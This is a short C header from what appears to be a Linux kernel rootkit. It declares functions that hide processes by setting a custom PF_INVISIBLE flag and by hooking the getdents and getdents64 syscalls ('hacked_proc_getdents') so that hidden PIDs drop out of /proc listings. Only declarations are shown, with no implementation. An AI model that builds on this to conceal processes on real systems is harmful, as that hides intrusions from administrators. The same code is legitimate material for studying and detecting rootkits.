#ifndef OSCW_PROC_H_
#define OSCW_PROC_H_

#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/proc_ns.h>

#define PF_INVISIBLE 0x01000000

struct task_struct *
find_task_struct(pid_t pid);

int
is_invisible_pid(pid_t pid);
int
is_invisible_task_struct(struct task_struct *task);

void
toggle_invisability(struct task_struct *task);

asmlinkage long
hacked_proc_getdents(const struct pt_regs *pt_regs);
asmlinkage long
hacked_proc_getdents64(const struct pt_regs *pt_regs);

#endif // OSCW_PROC_H_
